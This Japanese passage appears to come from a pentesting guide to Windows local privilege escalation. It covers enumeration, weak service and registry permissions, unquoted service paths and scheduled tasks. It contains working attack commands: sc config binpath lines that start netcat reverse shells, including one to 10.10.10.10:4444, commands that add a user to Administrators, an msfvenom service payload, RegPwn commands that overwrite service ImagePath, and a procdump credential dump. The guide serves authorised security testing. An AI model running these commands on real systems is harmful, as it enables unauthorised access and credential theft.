[**Cached Credentialsの詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## ユーザーとグループ

### ユーザーとグループの列挙

自分が所属しているグループに、興味深い権限がないか確認してください。

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### 特権グループ

**特権グループに所属している場合、権限昇格できる可能性があります**。特権グループと、権限昇格のためにそれらを悪用する方法についてはこちらをご覧ください。


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

このページで**トークン**について詳しく学びましょう：[**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
以下のページでは、**興味深いトークン**と、それらを悪用する方法について学べます。


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログインユーザー / セッション

```bash
qwinsta
klist sessions
```

### ホームフォルダー

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### パスワードポリシー

```bash
net accounts
```

### クリップボードの内容を取得する

```bash
powershell -command "Get-Clipboard"
```

## 実行中のプロセス

### ファイルとフォルダーのアクセス許可

まず、プロセスを一覧表示する際は、**プロセスのコマンドライン内にパスワードがないか確認してください**。\
実行中のバイナリを**上書きできるか**、またはバイナリのあるフォルダーへの書き込み権限があるかを確認し、[**DLL Hijacking attacks**](dll-hijacking/index.html)を実行できる可能性を探ります。

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

常に実行中の [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) がないか確認してください。これを悪用して権限昇格できる可能性があります。

debugger listener は短時間しか起動しないことがあるため、受動的なポートスナップショットで見つからなかったからといって、公開されていなかったとは限りません。検出した listener について、PID、プロセスの所有者、および権限の低いユーザーからアクセス可能かどうかを照合してください。アプリケーション名や debug フラグだけでは、ユーザーをまたいだコード実行が可能だとは判断できません。通常の列挙は受動的に行い、debugger コマンドは送信しないでください。

**プロセスのバイナリの権限を確認する**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**プロセスのバイナリが置かれているフォルダーのアクセス許可を確認 (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort の dynamic preprocessor ディレクトリ

Snort 2 は、`snort.exe -c <config>` で指定した設定ファイル内の `dynamicpreprocessor directory` から共有ライブラリを読み込めます。別のアカウントで Snort を実行するスケジュールタスクまたはサービスの場合は、その設定ファイルと、指定されたモジュールディレクトリの ACL を確認してください。そこにファイルを作成できるトークンを持っている場合、そのタスクまたはサービスが次にモジュールを読み込む際にコード実行につながる可能性があるため、調査候補となります。実行アカウントの有効な権限、使用中の設定、モジュールとの互換性、拒否設定や共有制限を確認してください。ディレクトリが書き込み可能であるだけでは、権限昇格の証明にはなりません。[Snort の dynamic preprocessor に関するドキュメント](https://www.snort.org/documents/dpx-readme)では、実行時のモジュール読み込みについて説明しています。

### 書き込み可能なドキュメントルートを持つ特権 Web サービス

Windows の Apache インストールでは、サービスの実行ファイルパスと実行アカウントを、アクティブな `httpd.conf` 内の `DocumentRoot` と照合してください。一般的な XAMPP の構成では、`C:\xampp\apache\conf\httpd.conf` と、設定されているドキュメントルート（通常は `C:\xampp\htdocs`）の ACL を確認します。Apache が `LocalSystem` として実行されているとき、低権限ユーザーがそのルートにファイルを作成できる場合、サーバー側のコード実行によってホストの権限境界を越えられる可能性があります。サービスが実行中であること、正確なパスが公開されていること、対象のファイル形式がサーバー側のハンドラーで処理されることを確認してください。ルートへの書き込みが可能であるだけでは、ファイルを作成できることしか証明できません。プローブを書き込まずに ACL を確認します：

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

For a conventional WAMP installation, serviceはバージョン付きの `C:\wamp64\bin\apache\apache*\bin\httpd.exe`（32-bit構成では `C:\wamp\...`）を指している場合があります。設定ファイルはその隣の `conf\httpd.conf` にあり、デフォルトのルートは `C:\wamp64\www` または `C:\wamp\www` です。service image、実行ユーザー、実効 `DocumentRoot`（`${INSTALL_DIR}` の展開や virtual-host の上書きを含む）、ルートの ACL をまとめて確認してください。WAMP ディレクトリに書き込み可能だからといって、Apache が `SYSTEM` として実行されている、あるいは提出したファイルを実行するとは限りません。[Apache は、Windows service が設定を選択する方法を説明しています](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service)。

### 書き込み可能な IIS ルートと application-pool の network identity

IIS では、`applicationHost.config` 内で書き込み可能な物理ディレクトリが**有効な site/application**に対応していることを確認し、設定済みの pool と server-side handler を特定してください。配信ディレクトリに置いたコードが pool の権限で実行されるのは、IIS がそのファイルタイプを処理し、該当ルートにアクセスできる場合だけです。書き込み可能なディレクトリをコード実行と判断する前に、現在のユーザーの実効的なファイル作成権限、site の稼働状態、handler、パスごとの上書き設定を確認してください。

ASP.NET の動的コンパイルについては、アプリケーションのコンパイルディレクトリに生成されるファイルという別の経路も確認が必要です。デフォルトでは、該当する .NET Framework インストール配下の `Temporary ASP.NET Files` ディレクトリが使われますが、アプリケーションの `<compilation tempDirectory>` で変更できます。[Microsoft は場所とアプリケーションごとのサブディレクトリについて説明しています](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29)。また、application pool 同士が互いを信頼しない場合に、コンパイルディレクトリを分離することを[推奨しています](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories)。低い権限の token が**特定の**アプリケーションの cache 内にある生成ソースを変更できる場合は、そのアプリケーションがより高い権限の [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) で再コンパイルするか確認してください。ファイルまたはディレクトリの ACL だけではコード実行の証明になりません。cache と有効なアプリケーション、実効 token と ACL、コンパイル設定、process identity、再コンパイルのタイミングを照合してください。読み取り専用のメタデータ確認にとどめ、列挙中にコンパイルを発生させたり、cache ファイルを変更したりしないでください。

`ApplicationPoolIdentity` または `NetworkService` として設定された IIS pool は、ローカルの token が低い権限であっても、通常は **host computer account** として domain リソースに認証します。`LocalSystem` はローカルですでに高い権限を持ち、network 上でも computer account を使います。`LocalService` は通常、匿名の network credentials を提示します。`SpecificUser` pool は、設定されたアカウントを使います。[Microsoft はこれらの identity の種類](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel)と[application-pool の network identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)について説明しています。identity 設定が省略されている場合は pool のデフォルトを継承することがあり、そのデフォルトは IIS の世代によって異なるため、pool 名から推測せず実効設定を確認してください。コード実行が computer-account の network identity を持つ pool に到達する場合は、**その特定のコンピューター**の directory 権限を評価してください。[DCSync](../active-directory-methodology/dcsync.md) には domain naming context に対する replication 権限が必要です。machine-account ticket や host の役割だけでは、その権限があることの証明になりません。Passive enumeration では、ファイルのアップロード、network authentication、ticket の要求を行わずに、設定と ACL を確認してください。

helper process を起動する読み取り可能な ASP.NET handler については、request 由来の値が authentication、decryption、validation、command construction を経る経路を追跡してください。decoded token を `ProcessStartInfo("cmd", "/c ...")` に連結する handler では、shell metacharacters によって command が変更される可能性があります。[Microsoft は `cmd` の特殊文字について説明しています](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd)。信頼できない caller が実際に decoded value に影響を与えられ、handler に到達できることを確認し、そのうえで実効 application-pool または impersonated identity と child process の identity を特定してください。読み取り可能なソースコードの一行、localhost listener、または token-format の弱点だけでは、特権での command execution の証明になりません。Passive enumeration 中は、偽装した request を送信したり helper を実行したりせず、ソースと pool の設定を確認してください。

Windows 上の PHP service で、request から制御できるパスが [`include` または `require`](https://www.php.net/manual/en/function.include.php) に渡される場合、低い権限のユーザーが書き込み可能な PHP ファイルが worker の identity で評価される可能性があります。request がその処理に到達できること、解決後のパスが低い権限のユーザーには変更可能で worker には読み取り可能なファイルを指すこと、該当する PHP のパス制限で include が許可されること、worker が実際により高い権限で実行されていることを確認してください。loopback listener や書き込み可能なファイルだけでは、この一連の条件が成立するとは限りません。Passive enumeration 中に endpoint を呼び出さず、ソース、service identity、ファイル ACL を確認してください。

### メモリからのパスワード採取

sysinternals の **procdump** を使って、実行中の process の memory dump を作成できます。FTP のような service は、**credentials を clear text でメモリに保持している**ことがあります。メモリを dump して credentials を読み取ってみてください。

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### 安全でないGUIアプリ

**SYSTEMとして実行されているアプリケーションは、ユーザーによるCMDの起動やディレクトリの閲覧を許可する場合があります。**

例: 「Windows ヘルプとサポート」（Windows + F1）で「command prompt」を検索し、「クリックしてコマンド プロンプトを開く」をクリックする

### 特権コンテキストでのプロジェクトファイルのインポート

低権限ユーザーが書き込めるドロップディレクトリからプロジェクトを自動的に開くアプリケーションは、インポートを行うアカウントの権限で入力の信頼境界を越えます。**実際の書き込み可能なパス**、それを開くプロセスまたはタスク、その実効ID、パーサーのビルドを確認してください。[過去のGhidraプロジェクトのオープン／復元に関する問題](https://github.com/NationalSecurityAgency/ghidra/issues/71)では、プロジェクトメタデータのXML external entityが許可されていました。Windowsでは、[送信SMBとNTLMのポリシー](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking)が許可していれば、ネットワーク上のentityによってインポートアカウントから認証が発生する可能性がありました。これは認証情報の露出につながる調査材料であり、直ちに管理者権限を得られるわけではありません。応答を利用するには、別途、許可された経路または脆弱な経路が必要であり、現行ビルドについては実際のパッチ適用状況を確認してください。受動的な列挙中に細工されたプロジェクトを開かないでください。インポートのワークフローとACLを調査してください。

## サービス

Service Control Manager（SCM）オブジェクトの[`SC_MANAGER_CREATE_SERVICE`権限](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)は、既存のサービスに対する権限とは別です。この権限を指定した読み取り専用の[`OpenSCManager`アクセス要求](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw)が成功しても、それは調査の手がかりにすぎず、新しいサービスを実行できる証明にはなりません。[`CreateService`はハンドルを返します](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew)。そのハンドルには作成時に要求されたサービスアクセス権が付与されます。後からサービスを再度開く場合は別途アクセスチェックが行われるため、元のハンドルを使用できても再オープンには失敗することがあります。実効的なローカルまたはリモートのトークン、付与されたハンドル権限、サービスアカウント、起動ポリシー、実行ファイルのパスをそれぞれ確認してください。受動的な列挙中にサービスを作成または起動しないでください。

リモートからサービスをインストールする経路を調べる場合は、SCM権限に加え、対象上の共有に**同じネットワークログオン**で書き込めるか、その共有の基盤となるNTFS ACL、そしてサービスアカウントが実行できるローカルの実行ファイルパスを照合してください。SCM権限が異例に広く、ファイルを配置できる経路もある場合、非管理者アカウントでもこの境界を越える可能性があります。管理共有は必須条件ではありません。共有への書き込み権限だけ、またはSCMのサービス作成権限だけでは、新しいサービスをより高いIDで起動できることの証明にはなりません。

既存のサービスは、起動時、終了時、または別のライフサイクルイベント時に、`ImagePath`に記載されていないヘルパー実行ファイルを呼び出すことがあります。ヘルパー名が低権限ユーザーの書き込み可能なディレクトリに解決され、サービスがより高い権限で実行される場合、存在しないヘルパーファイルは条件付きで置き換え候補になります。**実際のサービスコードまたは文書化されたヘルパー呼び出し**、解決される実行ファイルのパスと検索順序、ディレクトリ作成権限、サービスID、利用可能なライフサイクルトリガーを確認してください。サービスディレクトリが書き込み可能であることやファイルが存在しないことだけでは、そのサービスがファイルを読み込む証明にはなりません。受動的な調査ではサービスを起動または停止しないでください。

既存のサービスでは、[`SERVICE_START`は`StartService`に引数を渡すことを許可します](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew)。これは[`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)とは別の権限です。起動権限を単なる制御権限以上のものとして扱う前に、サービスのコードまたは文書化されたインターフェースを確認してください。呼び出し元が選択した引数をログまたはエクスポート先のパスとして使用する場合は、サービスID、引数から書き込みに至る正確な処理、パス制限、**作成されるファイル**のアクセス権を確認してください。保護されたディレクトリへの書き込みが権限昇格につながるのは、そのファイルを受け入れる別の特権コンシューマーまたはローダーが存在する場合に限られます。書き込み可能なログや起動権限だけでは不十分です。受動的なインベントリ調査では、サービスを起動したりテストファイルを作成したりしないでください。

NSClient++監視エージェントでは、読み取り可能な`nsclient.ini`は**設定を調査するための手がかり**です。Web認証情報が含まれている可能性があり、`boot.ini`によって設定の参照先が別の場所に変更されることもあります。実際のサービスアカウント、WEBリスナーとアクセスポリシー、認証済みロールで設定やスクリプトを変更できるかを確認してください。特権実行にはさらに、`CheckExternalScripts`（または別の有効な実行経路）、コマンドを登録または変更する実効権限、サービスIDで実行するトリガーが必要です。ループバック限定のリスナーでもローカルユーザーがアクセスできる場合がありますが、ファイルパス、パスワード、リスナーだけでは、これらの権限があることの証明にはなりません。受動的な列挙中は、秘密情報を表示したりWeb APIを呼び出したりせずに、メタデータとアクセス権を確認してください。[NSClient++のファイルレイアウト](https://nsclient.org/docs/concepts/file-layout/)、[Webとスクリプトのセキュリティに関するガイダンス](https://nsclient.org/docs/setup/securing/)、[外部スクリプトの設定](https://nsclient.org/docs/reference/check/CheckExternalScripts/)を参照してください。

`ImagePath`が`nssm.exe`であるサービスについては、サービスの実際の実行アカウントと`HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`の値を調査してください。[NSSMは子アプリケーションをここに保存します](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h)。`AppDirectory`は設定された作業ディレクトリです。ラッパーの権限だけでサービスの境界全体を判断する前に、子プロセスの実行ファイルとその親ディレクトリのACLを確認してください。その子プロセスが公開するローカルWCFまたはSOAPエンドポイントは、別途調査すべき手がかりです。低権限ユーザーがリスナーにアクセスできるか、対象の操作がそのユーザーの入力を受け付けるか、サービスの子プロセスがより高いIDで安全でない操作を実行するかを確認してください。サービスアカウント、エンドポイントURL、書き込み可能なパスのいずれかだけでは権限昇格の証明にはなりません。受動的な列挙中にサービス操作を呼び出さないでください。

カスタムWCF操作では、呼び出し元が制御する文字列がPowerShell runspaceに渡される箇所まで追跡してください。[`Pipeline.Commands.AddScript`はスクリプトテキストを追加します](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript)。[`Pipeline.Invoke`はパイプラインを実行します](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke)。[Windowsトランスポート資格情報を使用する`netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding)はクライアントを認証しますが、**その特定の**操作を呼び出す権限とrunspaceの実効IDは別途確認する必要があります。低権限の呼び出し元の入力から、より高いサービスIDで実行される`AddScript`までの経路は、コード実行の境界です。リスニングポート、認証済みクライアント、または無関係なアセンブリにある未使用のメソッドだけでは証明になりません。列挙中にエンドポイントを呼び出さず、デプロイ済みサービス、コントラクト、認可設定、偽装設定を静的に確認してください。

Service Triggersを使うと、特定の条件（名前付きパイプ／RPCエンドポイントのアクティビティ、ETWイベント、IPの利用可能状態、デバイスの接続、GPOの更新など）が発生したときにWindowsがサービスを起動できます。SERVICE_START権限がなくても、トリガーを発生させて特権サービスを起動できることがよくあります。列挙と起動の手法については、以下を参照してください。

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio診断コレクターサービス

C/C++ツールを含むVisual Studioのインストールには、`LocalSystem`として実行するよう設定された診断サービス`VSStandardCollectorService150`が含まれる場合があります。[CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/)では、junctionとobject-manager-linkの競合状態を利用して、サービスのDACLリセット先をリダイレクトしました。実証された権限昇格には、使用可能なVisual Studio Setup WMI ProviderのMSI修復経路と、その対象である`C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`も必要でした。このコンポーネントは2024年1月に修正されています。

受動的なトリアージでは、そのサービスのアカウントとバイナリパスを調べ、Setup WMI compilerのパスが存在するかを確認し、インストール済みコンポーネントのパッチ適用状況を確認してください。サービスエントリ、Visual Studioの製品バージョン、コンパイラファイルだけでは、ホストが脆弱である証明にはなりません。サービスの起動や修復の実行は不要です。

サービスの一覧を取得します。

```bash
net start
wmic service list brief
sc query
Get-Service
```

### 権限

サービスの情報を取得するには **sc** を使用できます。

```bash
sc qc <service_name>
```

各サービスに必要な権限レベルを確認するには、_Sysinternals_ のバイナリ **accesschk** を用意しておくことをお勧めします。

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

「Authenticated Users」がサービスを変更できるか確認することをお勧めします。

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[XP 用の accesschk.exe はこちらからダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効にする

次のエラーが発生する場合（例：SSDPSRV）:

_システム エラー 1058 が発生しました。_\
_サービスは無効になっているか、有効なデバイスが関連付けられていないため、開始できません。_

次のコマンドで有効にできます。

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**upnphost サービスが動作するには SSDPSRV に依存していることに注意してください（XP SP1 の場合）**

**この問題の別の回避策**は、次を実行することです。

```
sc.exe config usosvc start= auto
```

### **サービスバイナリパスの変更**

「Authenticated users」グループがサービスに対する**SERVICE_ALL_ACCESS**を持つシナリオでは、サービスの実行可能バイナリを変更できます。**sc**を変更して実行するには:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### サービスの再起動

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

権限のエスカレーションは、さまざまな権限を通じて可能です。

- **SERVICE_CHANGE_CONFIG**: サービスバイナリの再設定を許可します。
- **WRITE_DAC**: 権限の再設定を可能にし、サービス設定の変更につながります。
- **WRITE_OWNER**: 所有権の取得と権限の再設定を可能にします。
- **GENERIC_WRITE**: サービス設定を変更する権限を継承します。
- **GENERIC_ALL**: サービス設定を変更する権限も継承します。

この脆弱性の検出と悪用には、_exploit/windows/local/service_permissions_ を利用できます。

### サービスバイナリの弱い権限

サービスが **`LocalSystem`**、**`LocalService`**、**`NetworkService`**、または特権を持つドメインアカウントで実行されている一方、**低権限ユーザーがサービスの EXE またはその親フォルダを変更できる**場合、**バイナリを置き換えてサービスを再起動する**ことで、サービスを乗っ取れることがよくあります。

**サービスによって実行されるバイナリを変更できるか**、またはバイナリが配置されている**フォルダへの書き込み権限があるか**を確認してください ([**DLL Hijacking**](dll-hijacking/index.html)**)。**\
**wmic** (system32 にはありません) を使ってサービスによって実行されるすべてのバイナリを取得し、**icacls** を使って権限を確認できます。

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

**sc** と **icacls** も使用できます。

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

サービス実行ファイルまたはそれを含むディレクトリに対して、**`Everyone`**、**`BUILTIN\Users`**、**`Authenticated Users`**に付与された危険なACLを探します。特に**`(F)`**、**`(M)`**、**`(W)`**に注意してください。実用的な悪用手順は次のとおりです:<sup>[[27]](#references)</sup>

1. `sc qc <service_name>`でサービスアカウントと実行ファイルのパスを確認します。
2. `icacls <path>`でバイナリが書き込み可能か確認します。
3. サービスバイナリをpayloadまたは有効な悪意あるサービスバイナリに置き換えます。
4. `sc stop <service_name> && sc start <service_name>`でサービスを再起動します（または再起動／サービスのトリガーを待ちます）。

便利な自動チェック:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> サービスが通常ユーザーによる再起動を許可していない場合は、起動時に自動で開始されるか、障害時に再起動するアクションが設定されているか、またはそのサービスを使用するアプリケーションから間接的に起動できるかを確認してください。

### サービスレジストリの変更権限

サービスレジストリを変更できるかどうか確認してください。\
サービスレジストリに対する**権限**は、次の方法で**確認**できます。

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

特定のサービスキーに対して、**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が書き込み可能なレジストリ権限を持つか確認してください。ACLエントリがあるだけでは、実効アクセスがあるとは限りません。拒否エントリ、現在のトークン、継承された権限も関係します。レジストリキーの権限は、サービスオブジェクトの `SERVICE_CHANGE_CONFIG` および `SERVICE_START` 権限とは別です。権限昇格には、利用可能なサービス構成フィールド、サービスを起動する手段、そしてより高い権限を持つサービスIDも必要です。Microsoftの[レジストリキーの権限](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights)と[サービスのアクセス権リファレンス](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)を参照してください。

実行されるバイナリのPathを変更するには:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### 任意の HKLM value write を可能にするレジストリ symlink race (ATConfig)

一部の Windows アクセシビリティ機能は、ユーザーごとの **ATConfig** キーを作成します。このキーは後に **SYSTEM** プロセスによって HKLM のセッションキーにコピーされます。レジストリの **symbolic link race** を利用すると、この特権による書き込み先を **任意の HKLM パス**にリダイレクトでき、任意の HKLM **value write** プリミティブを得られます。<sup>[[18]](#references)</sup>

主な場所（例: オンスクリーン キーボード `osk`）:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` には、インストール済みのアクセシビリティ機能が列挙されます。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` には、ユーザーが制御する設定が保存されます。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` は、ログオン時やセキュアデスクトップへの切り替え時に作成され、ユーザーが書き込み可能です。

悪用の流れ (CVE-2026-24291 / ATConfig):

1. SYSTEM に書き込ませたい値を **HKCU ATConfig** に設定します。
2. **LockWorkstation** などを実行してセキュアデスクトップへのコピーをトリガーし、AT broker の処理を開始します。
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` に **oplock** を設定して **race に勝ちます**。oplock が発動したら、**HKLM Session ATConfig** キーを、保護された HKLM の対象キーを指す **registry link** に置き換えます。
4. SYSTEM が、攻撃者の指定した値をリダイレクト先の HKLM パスに書き込みます。

任意の HKLM value write を取得したら、サービス設定値を上書きして LPE に移行します:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/コマンドライン)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

通常のユーザーが起動できるサービス（例: **`msiserver`**）を選び、書き込み後に起動します。**注:** 公開されている exploit の実装では、race の一部としてワークステーションをロックします。

ツールの例 (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory permissions

レジストリに対するこの権限がある場合、**そのレジストリの下にサブレジストリを作成できます**。Windows services の場合、これは**任意のコードを実行するのに十分です**。

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

実行ファイルのパスが引用符で囲まれていない場合、Windows はスペースまでの各部分を実行しようとします。

たとえば、パスが _C:\Program Files\Some Folder\Service.exe_ の場合、Windows は次のファイルを実行しようとします。

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Windows標準サービスに属するものを除き、引用符で囲まれていないサービスパスをすべて列挙します：

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**この脆弱性は** metasploit を使って検出および悪用できます: `exploit/windows/local/trusted\_service\_path` metasploit を使ってサービスバイナリを手動で作成することもできます:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Recovery Actions

Windows では、サービスが失敗した場合に実行するアクションをユーザーが指定できます。この機能は、バイナリを指すように設定できます。そのバイナリを置き換え可能な場合、privilege escalation が可能なことがあります。詳細は[公式ドキュメント](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)を参照してください。

## Scheduled task のスクリプトターゲット

有効なタスクが `.bat` または `.cmd` ファイルを指定して `cmd.exe /c` を実行する場合、`cmd.exe` に加えて、**アクションの引数**で指定されたスクリプトも確認してください。PowerShell の `-File` など、インタープリターに明示的なファイル引数を渡す場合も同様です。Scheduled batch file にリテラルの PowerShell `-File` 呼び出しが含まれる場合は、参照先スクリプトの ACL も確認してください。変数、条件分岐、シェルの連結については手動で追跡する必要があります。呼び出し元が書き込み可能なスクリプトや親ディレクトリが、アカウントをまたいだ実行につながるのは、設定されたタスクのプリンシパルが呼び出し元と異なり、かつタスクが実際にそのアクションに到達する場合に限られます。スクリプトでは追加のみ可能な ACL も問題になることがありますが、先行する `exit` やその他の制御フローによって、追加した行が実行されない場合があります。privilege escalation を主張する前に、実効 ACL、[タスクの実行コンテキスト](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks)、作業ディレクトリ、トリガー、アプリケーション制御ポリシーを確認してください。インベントリ作業でスクリプトを変更したり、タスクを開始したりしてはいけません。

## アクセス可能なファイルの名前付きストリーム

